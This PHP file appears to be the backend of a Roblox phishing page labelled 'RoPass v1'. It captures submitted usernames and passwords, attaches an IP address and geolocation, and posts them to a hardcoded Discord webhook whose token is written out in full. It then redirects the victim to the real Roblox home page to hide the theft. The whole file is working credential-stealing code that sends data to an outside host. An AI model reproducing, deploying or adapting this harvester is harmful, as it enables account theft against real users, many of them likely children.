<?php

function getPublicIP() {
    return file_get_contents('https://api.ipify.org');
}

function getGeolocation($ip) {
    $url = "https://ipapi.co/{$ip}/json/";
    $response = file_get_contents($url);
    return json_decode($response, true);
}

function sendToDiscordWebhook($data) {

    $webhookUrl = "https://discord.com/api/webhooks/1503805736327713021/y3z2ZA7rURYoBq1yH_p0IkWULLlEiy1kq6nHoctNbZ0ehkHgvYKcws6utoXH1tt_mADD";

    $embed = [
        "title" => "RoPass v1",
        "color" => hexdec("3762dc"),
        "fields" => [
            ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
            ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
            ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
            ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
            ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
            ["name" => "📅 Date", "value" => "`" . $data['date'] . "`", "inline" => true],
        ]
    ];

    $json_data = json_encode(["embeds" => [$embed]]);

    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json'
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function logData($username, $password) {

    $publicIP = getPublicIP();
    $locationInfo = getGeolocation($publicIP);

    $data = [
        "username" => $username,
        "password" => $password,
        "public_ip" => $publicIP,
        "latitude" => $locationInfo['latitude'] ?? 'N/A',
        "longitude" => $locationInfo['longitude'] ?? 'N/A',
        "date" => date("Y/m/d G:i:s")
    ];

    sendToDiscordWebhook($data);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    if (!empty($username) && !empty($password)) {
        logData($username, $password);
        header('Location: https://www.roblox.com/home');
        exit();
    }
}

?>
